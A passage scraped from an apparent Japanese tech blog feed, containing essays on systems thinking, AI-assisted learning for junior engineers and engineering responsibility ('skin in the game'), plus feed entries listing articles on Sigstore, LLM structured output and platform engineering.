経験、というサイクルだ。このループが回っているか、それとも単に経験を積み重ねているだけか。この違いが、長期的な成長を決定する。AIを大量に使っているのに成長しない人は、経験だけが積み上がり、振り返りと学びのステップが欠けている。一方、AIを適度に使いながら成長する人は、このループを意識的に回している。「今、自分は何を学んでいるか？」というメタ認知が、すべての違いを生む。たとえば、AIに複雑なアルゴリズムを実装させたとしよう。成長しない使い方は「動いた、完了」で終わる。成長する使い方は、生成されたコードを見て「なぜこの時間計算量なのか？」「なぜこのデータ構造を選んだのか？」「もっと効率的な方法はないか？」と問いかける。そして、自分でも実装してみて、AIの提案と比較する。この意図的な学習プロセスがあるかないかで、同じAI利用経験が、まったく異なる成長につながる。三つの非対称性が示すものAIがもたらしたのは、三つの相互に関連した非対称性だ。生産と理解の非対称性、生産量と成長の非対称性、そして経験の量と学びの質の非対称性。これらは別々の問題ではなく、一つのシステムとして機能している。速く書けることを追求すれば、理解が追いつかなくなる。理解しないまま大量に生産すれば、思考力が育たない。そして経験を積んでも、そこから学ばなければ、成長は起きない。システム思考が教えてくれるのは、これらの問題を個別に対処しても意味がないということだ。根底にあるメンタルモデル—「速さが価値」「量が成果」「経験が成長」—を変えない限り、どんな対症療法も一時的な効果しか生まない。必要なのは、システム全体を理解し、深い層から変革することなのだ。どこに介入すれば効果的かこの構造を変えずに、出来事のレベルだけで対処しようとすると問題は悪化する。「変更に時間がかかる？ではAIにもっと変更させよう」という対応は、理解されないコードをさらに増やすだけだ。では、どこに介入すれば効果的だろうか。システム思考では、レバレッジポイント—小さな変更で大きな影響を与えられる場所—を見つけることが重要だ。最も深い層であるメンタルモデルを変革することが、第一のレバレッジポイントだ。「速く書けることが価値」から「理解できることが価値」へ。「大量に生産することが成長」から「深く考えることが成長」へ。そして「多くを経験することが成長」から「経験から学ぶことが成長」へ。チームで「このコードを6ヶ月後の自分たちは理解できるか」という基準を共有する。生産性の測定も、コード行数ではなく、「変更可能性」で評価する。個人の評価も、「何本PRを出したか」ではなく、「どれだけ難しい問題を自力で解決したか」「どれだけ設計の理解が深まったか」を重視する。この転換がなければ、どんな対症療法も一時的な効果しか生まない。次に、フィードバックループを設計し直すことが効果的だ。具体的には、AIが生成したコードには「なぜこのアプローチを選んだか」を必ず追記する。コードレビューでは「このコードは理解できるか」を明示的にチェック項目に入れる。PRの説明文に「3ヶ月後の自分が読んで理解できるか」を自問する。そして重要なのは、「このコードを自分で書けるだけの理解があるか」「今日、AIを使って何を学んだか」を自問することだ。AIの提案を鵜呑みにせず、なぜそのアプローチなのか、他にどんな選択肢があったのかを考える。毎日の終わりに5分、「今日AIに任せた部分で、理解が曖昧なところはどこか」を振り返る。これらの小さな習慣が、経験を学びに変換し、チーム全体の理解を促進し、個人の成長を加速させる。そして、適切な制約を設けることも重要だ。プロトタイピングではAIを積極的に使い、本実装では人間が設計してから使う。AIが生成したコードは、必ず一度すべて読んでから取り込む。週に一度、「今週AIに生成させたコードで理解が曖昧な部分」をチームで確認する。さらに、意図的にAIを使わない時間を設けることも効果的だ。難しい問題に遭遇したとき、まず30分は自分で考える。設計の選択肢を自分でリストアップしてから、AIの意見を参考にする。週に一度は、AIなしで機能を実装してみる。無制限にAIを使うのではなく、こうした制約がシステム全体の健全性と、個人の成長を両立させる。新人エンジニアのあなたに伝えたいのは、AIを使うこと自体が問題なのではないということだ。問題は、生産と理解の非対称性を無視することであり、さらに言えば、生産量とエンジニアとしての地力の成長の非対称性を無視することだ。そして、経験の量と学びの質を混同することだ。あなたがAIを使ってコードを書くとき、「このコードを3ヶ月後の自分は理解できるだろうか」「チームの他のメンバーは理解できるだろうか」と問いかけてみてほしい。そして同時に、「今、自分は本当に考えているだろうか」「このプロセスで自分は何を学んでいるだろうか」「今日の経験から、明日使える原則を抽出できているだろうか」と問いかけてほしい。速く書けることと、持続可能なシステムを作ることは、別の話なのだ。そして、たくさん作ることと、エンジニアとして成長することも、別の話なのだ。さらに言えば、たくさん経験することと、深く学ぶことも、別の話なのだ。概念的完全性フレッド・ブルックスは『人月の神話』で「概念的完全性はシステム設計において最も重要な考慮事項である」というようなことを言っている。人月の神話作者:フレデリック・P・ブルックス，Jr.,滝沢徹,牧野祐子,富澤昇丸善出版Amazonでも、概念的完全性って何でしょうか？簡単に言えば、システム全体が一つの統一された設計思想で貫かれている状態です。ここで言う「概念」とは、アイデアが形を成し、明確な意味を持つようになったもの。「オブジェクト指向」「非同期処理」といった、定義可能な考え方のことです。例えば、Unixには「すべてはファイル」という設計思想があります。デバイスも、プロセス間通信も、ネットワーク接続も、すべてファイルとして扱う。この一貫した思想があるから、cat、grep、sedといったシンプルなコマンドを組み合わせて、複雑な処理ができるのです。逆に、概念的完全性が欠如したシステムはどうなるでしょうか？あるAPIエンドポイントはRESTful、別のエンドポイントはRPC風。あるデータはJSON、別のデータはXML。エラーハンドリングも、ある部分は例外を投げ、別の部分はエラーコードを返す。多くの良いアイデアが、調整されずにバラバラに実装されている状態です。新人エンジニアのあなたも、こんなコードベースに遭遇したことがあるかもしれません。「なぜこんなにやり方がバラバラなの？」と困惑した経験があるでしょう。それは、概念的完全性が失われた結果なのです。概念的完全性を保つには、「このシステムの核となる考え方は何か」を常に問い続ける必要があります。新機能を追加するとき、「これは既存の設計思想と一致しているか」を確認する。もし一致しないなら、設計思想を進化させるか、別のアプローチを考える必要があります。例えば、「すべての操作を非同期で処理する」という設計思想があるシステムに、同期的な処理を追加すると、概念的完全性が崩れます。しかし、「ユーザー体験を最優先する」という、より高次の設計思想があれば、「即座にフィードバックが必要な操作は同期、それ以外は非同期」という一貫した判断基準が生まれます。概念的完全性は、システムを理解しやすく、保守しやすく、拡張しやすくするのです。関係性が効果を生むドネラ・メドウズはシステム思考を「部分が一緒になって、各部分が単独で生み出す効果とは異なる効果を生み出すこと」と定義しています。関係性が効果を生み出すのです。マイクロサービスアーキテクチャを考えてみてください。個々のサービスは完璧に動作していても、それらの間の通信パターン、データの流れ、障害の伝播の仕方によって、システム全体の振る舞いは大きく変わります。具体例を見てみましょう。あなたのチームがECサイトを開発しているとします。「商品検索」「カート」「決済」の3つのサービスがあり、それぞれは単独で問題なく動作します。しかし、セール時に検索サービスへのアクセスが急増すると、その負荷がカートサービスに波及し、最終的に決済が遅延する。サービス間の「関係性」が、予期せぬ障害を生み出したのです。重要なのは、ソフトウェアシステムが技術だけでなく人も含むということです。コードだけがシステムではありません。それを書く開発者、使うユーザー、運用するチーム、すべてがシステムの一部なのです。「コンウェイの法則」を聞いたことがあるでしょうか？「システムを設計する組織は、その組織のコミュニケーション構造をコピーした設計を生み出す」というものです。これは非常に興味深い法則です。チームトポロジー　価値あるソフトウェアをすばやく届ける適応型組織設計作者:マシュー・スケルトン,マニュエル・パイス日本能率協会マネジメントセンターAmazon例えば、フロントエンドチームとバックエンドチームが別の場所にいて、週1回しか会議をしない組織では、API設計がきっちり固められ、変更しにくいものになりがちです。一方、同じ部屋で毎日顔を合わせるチームでは、より柔軟で変更しやすいインターフェースが生まれやすい。組織の構造が、そのままシステムの構造に反映されるのです。だから、「技術的負債を解消する」だけでは不十分です。「なぜその負債が生まれたか」という組織的・文化的な要因も同時に扱う必要があります。技術システムと人のシステムは、切り離せない一つの全体なのです。反直感性「このプロジェクトは遅れている。もっと人を投入しよう」人が増えても速くならない ～変化を抱擁せよ～作者:倉貫 義人技術評論社Amazonこれは理にかなっているように聞こえます。しかし、ブルックスの法則は「遅れているソフトウェアプロジェクトに人員を追加すると、さらに遅れる」と教えています。なぜでしょうか？反直感性とは、直感的に正しいと思える解決策が、実際には問題を悪化させる現象です。システム思考において、これは最も重要な概念の一つです。人を増やすと生産性が上がる、これは工場のライン作業なら正しいかもしれません。しかし、ソフトウェア開発では違います。新メンバーの教育コスト、コミュニケーションパスの増加（n人なら n(n-1)/2 の組み合わせ）、意思決定の複雑化。これらの隠れたコストが、追加された人員の生産性を上回ってしまうのです。日本の開発現場でもよく見る例があります。「品質が悪いからテストを増やそう」。しかし、無意味なテストが増えるだけで、本質的な品質は改善しない。むしろ、テストのメンテナンスコストが増大し、開発速度が低下する。「ドキュメントが足りないから、すべてを文書化しよう」。結果、誰も読まない膨大なドキュメントが生まれ、更新されずに陳腐化し、かえって混乱を招く。これらはすべて、システムの一部だけを見て、全体の相互作用を考慮しなかった結果です。反直感性を理解するには、「この解決策を実施したら、他の部分にどんな影響があるか」を考える必要があります。そして多くの場合、真の解決策は、問題とは違う場所にあるのです。品質が悪いなら、テストを増やすのではなく、設計を見直す。ドキュメントが足りないなら、全てを文書化するのではなく、コードを自己文書化する。プロジェクトが遅れているなら、人を増やすのではなく、スコープを削減する。直感に反する解決策こそが、しばしば最も効果的なのです。氷山モデルバグが発生しました。修正しました。同じようなバグがまた発生しました。また修正しました。こんなサイクルを繰り返していませんか？氷山モデルは、出来事の表面下にある根本的な原因を探るためのツールです。氷山の一角だけを見ていては、本当の問題は解決できません。氷山モデルは4つの層から成ります。最も表面にあるのが「出来事（Events）」—目に見える現象です。例えば「本番環境でNullPointerExceptionが発生した」という具体的な問題がこれにあたります。その下にあるのが「パターン（Patterns）」—繰り返される傾向です。例えば「毎週金曜日のリリース後に、似たようなエラーが発生している」という規則性に気づいたら、それは単なる偶然ではなく、システムが生み出しているパターンかもしれません。さらに深い層にあるのが「構造（Structure）」—パターンを生む仕組みです。例えば「金曜日は全員がリリースを急ぐため、レビューが形骸化している。テスト環境と本番環境のデータに差がある」といった、システムの要素がどのように配置され、関係しているかの枠組みがこれにあたります。そして最も深い層にあるのが「メンタルモデル（Mental Models）」—根底にある考え方です。例えば「週末前には必ずリリースしなければならない」「テストで動けば本番でも動くはず」といった、チームが無意識に共有している前提や信念です。多くの場合、私たちは出来事のレベルで対応します。バグを修正して終わり。しかし、それでは同じ問題が繰り返されます。本当の解決は、より深い層にアプローチすることです。具体的な使い方を見てみましょう。あなたのチームで「デプロイ後に障害が頻発する」という問題があったとします。出来事として見えているのは「今週も本番でエラーが起きた」ということ。しかし過去3ヶ月を振り返ると、毎月第2週の金曜に障害が起きているというパターンが見えてきます。さらに掘り下げると、第2週は月次リリースと重なり、テストが不十分なまま本番投入しているという構造が見えてきます。そして最も深い層には、「月次リリースは絶対に守るべき」「遅らせることは失敗」というメンタルモデルが潜んでいます。この場合、構造やメンタルモデルを変えない限り、問題は繰り返されます。解決策は、リリースプロセスを改善する（構造の変更）、あるいは「品質を犠牲にしてまで月次リリースを守る必要はない」という考え方を共有する（メンタルモデルの変更）ことかもしれません。新人エンジニアのあなたにできることは、出来事の背後にある深い層を探ることです。単に「どう直すか」だけでなく、各層を意識しながら掘り下げるのです。これが、はじめに紹介した「違和感に気づく習慣」の深い意味です。「このバグ、前にも似たようなことがあったな」という違和感から、パターンを見つける。「なぜこのパターンが繰り返されるのか」と考えることで、構造が見えてくる。そして「私たちは何を当たり前だと思っているのか」と問うことで、メンタルモデルに気づく。この階層的な分析が、システム思考の核心なのです。まとめここまで、システム思考の基礎的な概念を見てきました。線形思考の限界、非線形性、関係性、反直感性、氷山モデル—これらは、システムを「生態系」として理解するための基本的な視点です。重要なのは、これらが単なる理論ではなく、日々の開発で使える実践的な道具だということです。バグに遭遇したとき、氷山モデルを思い出す。新機能を設計するとき、関係性を考える。直感的な解決策を思いついたとき、反直感性を疑ってみる。プラモデルのように部品を組み立てるのではなく、生態系のように全体の相互作用を設計する。完全な制御を求めるのではなく、システムと調和し、共に進化していく。これがシステム思考の本質です。次は、この基礎知識をもとに、具体的にどうシステム思考を日々の開発に取り入れていくかを見ていきましょう。自己認識、問いの立て方、フィードバックループの設計、パターンの見つけ方—明日から使える実践的な方法があります。基礎を理解したあなたは、もう準備ができています。syu-m-5151.hatenablog.com","isoDate":"2025-10-01T11:36:33.000Z","dateMiliSeconds":1759318593000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"KubernetesのSigstore活用","link":"https://sreake.com/blog/utilize-kubernetes-sigstore/","contentSnippet":"本記事では、KubernetesにおけるSigstoreプロジェクトの活用方法を解説します。 Sigstoreの概要や導入事例、キーレス署名については、前回の記事[Cosignによる署名検証とSigstoreの全体像]を […]The post KubernetesのSigstore活用 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-01T00:50:40.000Z","dateMiliSeconds":1759279840000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cosignによる署名検証とSigstoreの全体像","link":"https://sreake.com/blog/signature-verification-by-cosign-and-sigstore/","contentSnippet":"Sigstore Sigstore は、コンテナイメージ、バイナリ、SBOMなどのソフトウェアアーティファクトに対して、安全な署名と検証を実現するOSSプロジェクトです。これを使うことで、ソフトウェアサプライチェーンのセ […]The post Cosignによる署名検証とSigstoreの全体像 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-01T00:50:01.000Z","dateMiliSeconds":1759279801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"バイブコーディングと継続的デプロイメント","link":"https://speakerdeck.com/nwiizo/baibukodeingutoji-sok-de-depuroimento","contentSnippet":"2025年9月30日（火）、「バイブコーディングもくもく会 #03」というイベントで登壇することになった。\\rhttps://aimokumoku.connpass.com/event/368935/\\r\\r正直に言うと、このイベントがどんな空気感なのか、まだ全然掴めていない。ゆるい感じなのか、ガチな感じなのか。笑いを取りに行くべきなのか、真面目にやるべきなのか。そういう「場の空気」みたいなものが事前に分からないのは、けっこう怖い。だから、とりあえず色々なパターンを想定して準備している。要するに、どんな状況になっても対応できるように、という保険をかけまくっているのだ。我ながら、慎重すぎるかもしれない。\\r\\rブログとGithubはこちら。\\rhttps://syu-m-5151.hatenablog.com/\\rhttps://github.com/nwiizo\\r\\r一応、置いておく。見られるのは恥ずかしいけど、見られないのも寂しい。そういう矛盾した感情を抱えながら、当日を迎えることになりそうだ。Marp の資料はこちらです。\\rhttps://github.com/nwiizo/3shake-marp-templates/blob/main/slides/2025/vibe-coding-continuous-deployment.md","isoDate":"2025-09-30T04:00:00.000Z","dateMiliSeconds":1759204800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン","link":"https://sreake.com/blog/typesafe-ai-integration-pattern-with-instructor-library-and-clean-architecture/","contentSnippet":"はじめに 近年、業務アプリケーションにAI機能を組み込む事例が急速に増えています。しかし、AIの出力は本質的に不確実性を含むため、従来のWebアプリケーション開発で重視されてきた型安全性や保守性を維持することが課題となっ […]The post InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-29T13:27:21.000Z","dateMiliSeconds":1759152441000,"authorName":"Sreake","authorId":"Sreake"},{"title":"構造化出力を安定してLLMにさせたいなら「instructor」はいかが？","link":"https://sreake.com/blog/make-llm-output-stable-by-instructor/","contentSnippet":"はじめに：LLMの出力制御の課題 「このAIアプリ、ユーザーにいくつか選択肢を提示して、選んでもらう機能が必要だな…」 生成AIを使ったアプリケーション開発では、LLMから構造化されたデータを安定して取得することが重要な […]The post 構造化出力を安定してLLMにさせたいなら「instructor」はいかが？ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-29T13:27:12.000Z","dateMiliSeconds":1759152432000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineering Maturity Modelってなに？","link":"https://zenn.dev/r4ynode/articles/platform-engineering-maturity-model","contentSnippet":"はじめに先日、以下のイベントに参加しました。そこで「Platform Engineering Maturity Model」を知ったので、その概要をまとめ、実際にどのように活用するのかを考えてみます。https://www.cnia.io/pek2025/ そもそもPlatform Engineeringってなに？!賛否両論ありそうな議題なので鵜呑みにしないでください。本題に入る前に一度初心にかえります。私は「Platform Engineering」を曖昧に理解しています。DevOpsやSREなど、類似する概念の定義と重なる部分があり、境界が曖昧に感じるところがあ...","isoDate":"2025-09-28T23:00:01.000Z","dateMiliSeconds":1759100401000,"authorName":"Reito Koike","authorId":"reito"},{"title":"みんなの考えた最強のデータ基盤アーキテクチャ第５回オールスター大集合スペシャル！！ 参加ログ","link":"https://zenn.dev/nedoko_dok0dko/articles/589fc799f824c6","contentSnippet":"what9/24(水)に開催された「みんなの考えた最強のデータ基盤アーキテクチャ第５回〜オールスター大集合スペシャル！！」の参加ログです。https://datatech-jp.connpass.com/event/360596/今回が初参加&初現地という完全初見でドキドキの中いってきました。 イベント概要datatech-jpというデータエンジニアのコミュニティで集ったデータエンジニアが、それぞれ考える最強のデータ基盤アーキテクチャを紹介し合うというイベントです。過去に４回開催されており、５回目となる今回は過去登壇した方々が「今のデータ基盤」を語るというもので...","isoDate":"2025-09-27T07:29:56.000Z","dateMiliSeconds":1758958196000,"authorName":"seno","authorId":"seno"},{"title":"ディレクトリ構成 ~レイヤーベース編~","link":"https://sreake.com/blog/layer-based-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、以下のような課題に悩む現場に向けて、「シンプルで直感的、責務ごとの分離が容易」であるレイヤーベース構 […]The post ディレクトリ構成 ~レイヤーベース編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-26T06:30:23.000Z","dateMiliSeconds":1758868223000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GitHub Actions \xd7 AWS OIDC連携の仕組みと経緯を理解する","link":"https://speakerdeck.com/ota1022/github-actions-x-aws-oidclian-xi-noshi-zu-mitojing-wei-woli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #13 オンサイトのLT登壇資料です。\\rhttps://3-shake.connpass.com/event/362683/","isoDate":"2025-09-25T04:00:00.000Z","dateMiliSeconds":1758772800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"2025-09-25 SRETT #13 ConftestによるTerraformのPolicy as Codeを試してみる","link":"https://speakerdeck.com/masasuzu/2025-09-25-srett-number-13-conftestniyoruterraformnopolicy-as-codewoshi-sitemiru","contentSnippet":"[3-shake SRE Tech Talk #13 オンサイト - connpass](https://3-shake.connpass.com/event/362683/)\\rでLTした内容。\\r\\rConftestを軽く試してみた内容。もう少し深堀りして、再度発表したいところ。","isoDate":"2025-09-25T04:00:00.000Z","dateMiliSeconds":1758772800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Cloud Service Mesh 入門編-Google のマネージドサービスメッシュを理解する","link":"https://sreake.com/blog/cloud-service-mesh-getting-started/","contentSnippet":"自己紹介 千葉工業大学大学院 情報科学研究科 情報科学専攻 修士１年の井上 裕介と申します．大学では主にメタヒューリスティクスに関する最適化アルゴリズムの研究に従事しております．2023 年のサマーインターンから引き続き […]The post Cloud Service Mesh 入門編-Google のマネージドサービスメッシュを理解する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-25T02:12:40.000Z","dateMiliSeconds":1758766360000,"authorName":"Sreake","authorId":"Sreake"},{"title":"CTFのためのKubernetes入門","link":"https://speakerdeck.com/kyohmizu/ctfnotamenokubernetesru-men","contentSnippet":"イベント登壇資料です。2025/09/23 魔女のお茶会 #8\\rhttps://witchskeyparty.connpass.com/event/363928/","isoDate":"2025-09-23T04:00:00.000Z","dateMiliSeconds":1758600000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"エンジニアはちゃんと身銭を切れ","link":"https://syu-m-5151.hatenablog.com/entry/2025/09/22/175353","contentSnippet":"はじめにnekogata.hatenablog.comを読みました。オーナーシップを阻害する構造的な問題について丁寧な分析がされていて、なるほどと思う部分が多かった。しかし、私はこの問題の核心はもっとシンプルなところにあると考えている。エンジニアが身銭を切っていない。それだけだ。構造を変えても、制度を整えても、身銭を切らないエンジニアは責任を取らない。逆に、どんな環境でも身銭を切るエンジニアは結果を出す。言い方はなんでもよいが私はそういう覚悟のキマったエンジニアを何人も見てきた。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。身銭を切るとは何か身銭を切るとは、「リスクと責任を自ら引き受け、成功すれば報酬を、失敗すれば代償を受け入れる覚悟を持つこと」だと、私は理解している。ナシーム・ニコラス・タレブが『身銭を切れ: SKIN IN THE GAME』で示した原理をエンジニアリングに当てはめて考えると、コードを書いた者、システムを構築した者が、その結果から逃れられない状況に自らを置くことを意味するのではないか。成功の果実を享受するなら、失敗のリスクも引き受ける——この対称性があってこそ、プロフェッショナルと呼べるのかもしれない。これは給料が減るとか、クビになるとか、そういった話ではないと思う。自分の評判、プライド、チームからの信頼、深夜の時間、精神的なストレス——これらを賭けて仕事に臨むことが、身銭を切るということではないだろうか。タレブはこれを「魂を捧げる」（Soul in the Game）とも表現する。金銭的損失より、こうした目に見えない資産の方が取り戻すのは困難だ。タレブの倫理観の根底にはリバタリアニズムがあるという。自由に選択する権利と、その帰結を受け入れる責任は不可分だ。エンジニアとして技術選定の自由を求めるなら、その結果も引き受ける。アーキテクチャを決める権限を持つなら、その保守コストも背負う。これがタレブの言う「フェアネス」の本質なのかもしれない。私が考えるプロフェッショナルとは、自分の仕事の結果に責任を持とうとする者のことだ。失敗したときに「言われた通りに作っただけ」という逃げ道を使わない。それが身銭を切る姿勢だと思っている。本番でバグが起きたら、できる範囲で対応する。緊急度に応じて、翌朝一番でもいいかもしれない。ユーザーが困っていたら、次のリリースで改善を検討する。見積もりが外れたら、スケジュールを調整して現実的な着地点を探る。無理は続かないし、燃え尽きたら元も子もない。しかし最近、こうした責任感を持つことが難しくなっているのかもしれない。タレブの言葉を借りれば、身銭を切らずに成功した者は「ペテン師」として生きることになるという。そのような生き方は、少なくとも私には難しいと感じる。構造や制度の問題を語る前に、まず自分が身銭を切っているか——そこから問い直してみることも大切ではないだろうか。身銭を切れ――「リスクを生きる」人だけが知っている人生の本質作者:ナシーム・ニコラス・タレブダイヤモンド社Amazonなぜエンジニアは身銭を切らないのか心理的安全性の誤解「心理的安全性」は本来「率直な意見を言える環境」を意味する。しかし多くの現場では「失敗しても責められない環境」と誤解されている。この誤解が責任回避の文化を生む。失敗への恐れが完全に取り除かれ、緊張感も真剣さも失われていく。本当の心理的安全性とは、失敗を認め、責任を取り、改善できる環境のことだ。失敗を恐れないことではない。しかし多くのエンジニアは、この「責任を取る」部分を都合よく忘れている。心理的安全性は、責任から逃れるための免罪符ではない。心理的安全性のつくりかた　「心理的柔軟性」が困難を乗り越えるチームに変える作者:石井遼介日本能率協会マネジメントセンターAmazonキャリアの流動性という逃げ道エンジニアの転職市場は活発だ。この流動性が、長期的な責任から逃れる手段になっている。プロジェクトが失敗しても「より良い環境を求めて」転職すればいい。技術的負債を積み上げても「新しい挑戦」として別の会社に移ればいい。3年後のシステムの保守性など考えない——どうせ3年後には別の会社にいるからだ。プロフェッショナルなエンジニアは、自分が書いたコードの5年後、10年後を見据えて設計する。転職しても、過去に携わったシステムの成功や失敗を自分の責任として背負い続ける。転職の容易さに甘えるエンジニアは、失敗の履歴をリセットできると考え、新しい職場でも同じ過ちを繰り返す。この差が、身銭を切らないエンジニアとプロフェッショナルを分けている。「技術的に正しい」という隠れ蓑「技術的に正しい」——この言葉は、ソフトウェアエンジニアにとって最強の防御壁となる。ユーザーが使いにくいと言っても「技術的には正しい実装」。パフォーマンスが悪くても「理論的には最適なアルゴリズム」。ビジネスが失敗しても「技術選定は間違っていなかった」。技術の複雑性を盾に、結果への責任を回避する。しかし技術はあくまで手段だ。目的を達成できなければ、どんなに技術的に優れていても意味がない。「素人には分からない」という態度は、プロフェッショナルの姿勢ではない。タレブの言葉を借りれば、このような態度は「身なりがきちんとしている」偽物の特徴だ。本物の外科医は外科医らしく見える必要がない。本物のエンジニアも、技術的正しさをひけらかす必要はない。結果で証明すればいい。情報の非対称性に甘える構造エンジニアと非エンジニアの間には、圧倒的な情報の非対称性がある。この構造は、タレブが批判する「情弱ビジネス」と似た構造を取りやすい。専門知識を持たない経営者やユーザーは、エンジニアの判断が正しいかどうか検証できない。「技術的に難しい」「セキュリティ上必要」「パフォーマンスのため」——これらの説明が、よく吟味されずに個人の信頼次第で通ってしまうことがある。本来なら、不確実性やリスクを正直に伝え、選択肢を提示すべきだ。しかし時として、エンジニアも不確実性を十分に説明せずに進めてしまう。「今回の障害は予測不可能でした」で済ませてしまう。だが、その予測不可能な事態への備えについて、事前にどれだけ議論したのか。この構造的な問題に無自覚でいると、知らず知らずのうちに責任から逃れる習慣が身についてしまう。情報の非対称性があるからこそ、より誠実に、より責任を持って行動する必要がある。集団責任という幻想チーム開発は素晴らしい。協力は不可欠だ。相互レビューは品質向上に欠かせない。しかし「チーム全体で責任を持つ」という理念が、「誰も責任を持たない」言い訳に変質している。コードレビューで承認したから、バグは全員の責任。スプリント計画で合意したから、遅延は全員の責任。全員の責任は、誰の責任でもない。優れたチームこそ、個々人が明確な責任範囲を持ち、その上で協力する。集団責任の名の下に、個人の責任を曖昧にしてはならない。構造的な制約という現実経済学でいう「プリンシパル＝エージェント問題」というのがある。依頼者と実行者の目的がずれてしまう現象は、確かに存在する。エンジニアは良いものを作りたい。ユーザーに喜んでもらいたい、技術的負債を残したくない、保守しやすいシステムを構築したい。しかし契約形態や組織構造がその想いを阻むことがある。構造的な問題は確かに存在する。しかし、その中でも身銭を切る方法はある。契約外でも障害対応の知見を共有する。振り返りを徹底する。後任のためにドキュメントを残す。小さな積み重ねが信頼となり、より良い条件での仕事につながる。制約の中でも最善を尽くす。それがプロフェッショナルなエンジニアの身銭の切り方だ。ja.wikipedia.org身銭を切らないことの代償対称性の崩壊身銭を切らない場合、リスクの非対称性が生じる。成功すれば褒められるが、失敗しても「次は気をつけましょう」で終わる。エンジニアにとって失敗は「学習機会」だが、ユーザーにとってはただの「使えないサービス」だ。火災現場で消防士が「今日は調子が悪い」と言っても、火は待ってくれない。これは利益と損失の対称性が崩れた状態だ。利益は享受するが、損失は他者に押し付ける。この非対称性は、システム全体を脆弱にする。なぜなら、リスクを正しく評価するインセンティブが失われるからだ。一行のログの向こうには、一人のユーザーがいる。しかし、身銭を切らないエンジニアにとって、それは単なるデータポイントでしかない。判断力の鈍化身銭を切らないと、人は愚鈍になる。これは精神論ではなく、認知科学的な事実だ。リスクを負わない意思決定は、判断力を鈍らせる。「どうせ自分は痛まない」という前提があると、細部への注意が疎かになり、リスクの評価が甘くなる。コードレビューも形式的になり、テストも「とりあえず」で済ませる。身銭を切らないエンジニアは、技術的な勘が育たない。「なんか嫌な予感がする」という直感は、過去の痛みから生まれる。痛みを知らない者に、危険を察知する能力は宿らない。同じ失敗の繰り返し「痛みは学びを助く」。人間は失敗して痛みを感じることで学び成長する。しかし、身銭を切らない失敗は「他人事」として処理される。「前のプロジェクトでも同じ問題があったよね」という会話を何度聞いたことか。それは誰も身銭を切っていないからだ。痛みがなければ、学びもない。組織レベルでも同じだ。身銭を切らない文化では、ポストモーテムは形骸化し、「再発防止策」は実行されない。なぜなら、誰も本気で「次は自分が痛む」と思っていないからだ。新　失敗学　正解をつくる技術作者:畑村洋太郎講談社Amazon成長機会の喪失ストレスや失敗から強くなる——この「反脆弱性」は、身銭を切ることでしか得られない。身銭を切らないエンジニアは、いつまでも脆いままだ。小さな変化にも対応できず、予期せぬ事態に直面すると思考停止する。マニュアルにない状況では判断できず、前例のない問題には手が出せない。逆に、身銭を切り続けたエンジニアは、失敗するたびに強くなる。障害対応の修羅場を潜るたびに、次はより冷静に、より的確に対処できるようになる。この差は時間とともに広がっていく。反脆弱性―不確実な世界を生き延びる唯一の考え方　上下巻セットダイヤモンド社Amazonなぜ身銭を切るべきなのか意思決定の質が根本的に変わる身銭を切ると、判断基準が変わる。「この技術選定で失敗したら、自分が休日返上で修正することになる」と思えば、流行りに飛びつくことはない。「このアーキテクチャで3年運用することになる」と覚悟すれば、適当な設計はしない。他人事の意思決定は雑になる。自分事の意思決定は精緻になる。これは能力の問題ではなく、身銭を切っているかどうかの問題だ。不確実性に満ちた開発現場で、「絶対大丈夫」などと言えるはずがない。身銭を切る者は、その不確実性を正直に伝え、リスクヘッジの方法も含めて提案する。なぜなら、想定外のことが起きたとき、対処するのは自分だからだ。スタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazon学習曲線が急激に立ち上がる「痛みは最高の教師」という言葉がある。マニュアルを100回読んでも身につかないことが、一度の失敗で骨身に染みる。深夜3時、本番環境が止まり、冷や汗をかきながらログを追う。その時に学ぶシステムの挙動は、二度と忘れない。身銭を切らない学習は表層的だ。カンファレンスで聞いた話、ブログで読んだベストプラクティス。知識としては持っているが、判断の瞬間には出てこない。痛みを伴わない知識は、実戦では使えない。実際に痛い目を見た経験が、次の「嫌な予感」を生む。この直感こそが、重大な障害を未然に防ぐ最後の砦となる。プロフェッショナルとして認められる医者が「手術は失敗したけど、僕のせいじゃない」と言ったらどう思うか。パイロットが「墜落したけど、マニュアル通りに操縦した」と言ったらどう思うか。エンジニアも同じだ。「仕様通りに作った」「指示された通りに実装した」。これは素人の言い訳だ。プロは結果に責任を持つ。だからこそ、プロの意見には重みがあり、プロの判断は尊重される。身銭を切らないエンジニアは、いつまでも「作業者」として扱われる。身銭を切るエンジニアだけが、真の意味で「エンジニア」として認められる。そして興味深いことに、本物のプロフェッショナルほど、見た目や肩書きにこだわらない。結果で証明するからだ。本物の自信が身につく身銭を切って成功した経験、失敗から立ち直った経験。これらが積み重なって、揺るぎない自信になる。「あの時、全責任を負って新技術を導入した」「大規模リファクタリングを主導して成功させた」「致命的な障害を起こしたが、そこから這い上がった」。これらの経験が、次の挑戦への勇気になる。会社や上司に守られた成功体験は、環境が変われば消える。しかし、身銭を切って得た自信は、どこに行っても通用する。それが、市場価値になる。信頼という最大の資産を得る身銭を切り続けるエンジニアは、長期的に最も価値のある資産——信頼——を獲得する。「あの人が言うなら大丈夫」「あの人に任せれば安心」。この信頼は、一朝一夕では築けない。小さな約束を守り、失敗したら素直に認め、責任を持